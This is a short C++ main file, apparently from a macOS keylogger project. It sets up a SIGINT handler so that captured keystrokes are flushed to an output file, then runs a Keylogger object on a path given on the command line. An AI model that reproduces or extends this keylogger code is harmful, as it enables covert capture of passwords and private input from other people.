#include <csignal>
#include <iostream>

#include "keylogger.hpp"
#include "reporter.hpp" // TODO: Move to Keylogger

void signal_handler(int signum) {
  // This is a temporary workaround to end the run loop and allow the
  // destructors to run. Otherwise, the buffer won't be flushed and recorded
  // keys won't be written to the output file. TODO: Update to call
  // Keylogger::Stop.
  CFRunLoopStop(CFRunLoopGetCurrent());
}

int main(int argc, char** argv) {
  signal(SIGINT, signal_handler);

  try {
    Keylogger k(argv[1]);
    k.Run();
  } catch (const std::exception& e) {
    std::cerr << "error: " << e.what() << std::endl;
  }
}
